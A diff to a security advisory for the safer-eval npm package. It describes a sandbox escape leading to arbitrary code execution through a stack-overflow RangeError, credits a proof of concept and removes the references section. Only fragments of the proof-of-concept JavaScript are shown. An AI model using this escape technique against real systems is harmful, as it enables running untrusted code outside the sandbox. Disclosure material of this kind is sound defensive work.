@@ -1,9 +1,10 @@
+# Overview
 [safer-eval](https://www.npmjs.com/package/safer-eval) is a safer approach for eval in node and browser.
 
 Affected versions of this package are vulnerable to Arbitrary Code Execution via generating a  `RangeError: Maximum call stack size exceeded`.
 
 ## Proof of Concept (Credit: Jonathan Leitschuh)
-```
+```js
 const theFunction = function () {
   const f = Buffer.prototype.write;
   const ft = {
@@ -41,6 +42,3 @@ const untrusted = `(${theFunction})()`;
 
 console.log(saferEval(untrusted));
 ```
-## References
--   [GitHub Advisory](https://github.com/commenthol/safer-eval/security/advisories/GHSA-v63x-xc9j-hhvq)
--   [Safer-Eval Sandbox Escape POC](https://gist.github.com/JLLeitschuh/609bb2efaff22ed84fe182cf574c023a)
